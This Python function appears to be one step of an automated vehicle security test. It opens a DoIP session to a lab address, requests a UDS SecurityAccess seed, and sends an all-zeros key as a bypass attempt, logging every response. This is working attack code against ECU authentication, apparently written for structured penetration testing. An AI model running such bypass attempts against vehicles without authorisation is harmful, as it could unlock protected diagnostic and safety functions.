def run_step(context: dict, artifacts: dict) -> dict:
    import time

    observations = []

    # Tier 1 — endpoint values
    host = "172.23.96.1"
    port = 8445
    doip_version = 0x02
    doip_entity_address = 0x00E0
    client_logical_address = 0x0E00
    routing_activation_type = 0x00
    timeout_sec = 5

    # Tier 2 — target_ref values
    uds_service_security_access = 0x27

    # SecurityAccess sub-functions
    SA_REQUEST_SEED = 0x01  # requestSeed for securityAccessType 1
    SA_SEND_KEY = 0x02      # sendKey for securityAccessType 1

    try:
        from doipclient import DoIPClient

        # ── Connect and activate routing (prerequisite state) ──
        t0 = time.time()
        try:
            client = DoIPClient(
                host,
                doip_entity_address,
                client_logical_address=client_logical_address,
                tcp_port=port,
                protocol_version=doip_version,
                activation_type=routing_activation_type,
                connect_timeout=timeout_sec,
            )
            elapsed_connect = int((time.time() - t0) * 1000)

            observations.append({
                "name": "doip_tcp_connect_and_routing_activation",
                "value": {
                    "connected": True,
                    "elapsed_ms": elapsed_connect,
                    "error_str": "",
                }
            })
        except Exception as e_conn:
            elapsed_connect = int((time.time() - t0) * 1000)
            observations.append({
                "name": "doip_tcp_connect_and_routing_activation",
                "value": {
                    "connected": False,
                    "elapsed_ms": elapsed_connect,
                    "error_str": repr(e_conn),
                }
            })
            return {
                "observations": observations,
                "artifacts": {},
                "notes": "T3: Connection failed; cannot proceed with SecurityAccess.",
            }

        # ── Step 1: Request seed (SecurityAccess 0x27 sub=0x01) ──
        sa_seed_request = bytes([uds_service_security_access, SA_REQUEST_SEED])
        sa_seed_request_hex = sa_seed_request.hex()
        seed_hex = ""
        seed_bytes_received = 0
        seed_response_received = False
        seed_error = ""
        seed_raw = None

        t1 = time.time()
        try:
            seed_response = client.send_diagnostic(sa_seed_request, timeout=timeout_sec)
            elapsed_seed = int((time.time() - t1) * 1000)

            if seed_response is not None:
                seed_response_received = True
                try:
                    seed_raw = bytes(seed_response)
                    seed_hex = seed_raw.hex()
                    seed_bytes_received = len(seed_raw)
                except Exception:
                    seed_hex = repr(seed_response)
                    seed_bytes_received = len(seed_hex)
            else:
                elapsed_seed = int((time.time() - t1) * 1000)

        except Exception as e_seed:
            elapsed_seed = int((time.time() - t1) * 1000)
            seed_error = repr(e_seed)

        observations.append({
            "name": "send_security_access_request_seed",
            "value": {
                "request_hex": sa_seed_request_hex,
                "response_hex": seed_hex,
                "bytes_sent": len(sa_seed_request),
                "bytes_received": seed_bytes_received,
                "elapsed_ms": elapsed_seed,
                "response_received": seed_response_received,
                "error_str": seed_error,
            }
        })

        # ── Step 2: Send key (SecurityAccess 0x27 sub=0x02) ──
        # Attempt bypass with an all-zeros key matching the seed length.
        # The seed is in the positive response after the SID+subfunction echo bytes (0x67, 0x01).
        # If we got a positive response (first byte == 0x67), extract the seed.
        extracted_seed = b""
        if seed_raw and len(seed_raw) >= 2 and seed_raw[0] == 0x67:
            extracted_seed = seed_raw[2:]  # bytes after 0x67 0x01

        # Construct a trivial key: all zeros, same length as seed (bypass attempt)
        if len(extracted_seed) > 0:
            trivial_key = b"\x00" * len(extracted_seed)
        else:
            # If no seed extracted (negative response or empty), still attempt with a minimal key
            trivial_key = b"\x00\x00\x00\x00"

        sa_key_request = bytes([uds_service_security_access, SA_SEND_KEY]) + trivial_key
        sa_key_request_hex = sa_key_request.hex()
        key_hex = ""
        key_bytes_received = 0
        key_response_received = False
        key_error = ""

        t2 = time.time()
        try:
            key_response = client.send_diagnostic(sa_key_request, timeout=timeout_sec)
            elapsed_key = int((time.time() - t2) * 1000)

            if key_response is not None:
                key_response_received = True
                try:
                    key_raw = bytes(key_response)
                    key_hex = key_raw.hex()
                    key_bytes_received = len(key_raw)
                except Exception:
                    key_hex = repr(key_response)
                    key_bytes_received = len(key_hex)
            else:
                elapsed_key = int((time.time() - t2) * 1000)

        except Exception as e_key:
            elapsed_key = int((time.time() - t2) * 1000)
            key_error = repr(e_key)

        observations.append({
            "name": "send_security_access_send_key",
            "value": {
                "request_hex": sa_key_request_hex,
                "response_hex": key_hex,
                "bytes_sent": len(sa_key_request),
                "bytes_received": key_bytes_received,
                "elapsed_ms": elapsed_key,
                "response_received": key_response_received,
                "error_str": key_error,
                "key_strategy": "all_zeros_bypass",
                "seed_hex": extracted_seed.hex() if extracted_seed else "",
            }
        })

        # ── Cleanup ──
        try:
            client.close()
        except Exception:
            pass

    except ImportError as e_imp:
        observations.append({
            "name": "exception",
            "value": {
                "type": "ImportError",
                "message": str(e_imp),
                "request_hex": "",
            }
        })

    return {
        "observations": observations,
        "artifacts": {},
        "notes": "T3: SecurityAccess seed-key bypass attempt (all-zeros key) via doipclient to {}:{}".format(host, port),
    }